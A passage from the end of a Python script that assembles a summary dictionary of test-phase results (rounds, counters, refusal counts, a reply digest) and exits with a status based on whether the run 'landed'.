                    "gate2_floor_cpu_s", "logging_cfg_present",
                    "error", "error_detail", "child_returncode")},
        "m6": phase(m6, ("ok", "rounds_ok", "rounds_total", "counter_ok",
                         "counter_total", "answers_differ")),
        "m7": phase(m7, ("ok", "classes_ok", "classes_total", "twins_ok",
                         "twins_total", "refusal_witnesses_seen",
                         "state_refusals_seen", "clamp_refusals_seen",
                         "seam_alive_after_every_class", "reply_digest")),
    }))
    return 0 if res.get("landed") else 1


if __name__ == "__main__":
    raise SystemExit(main())
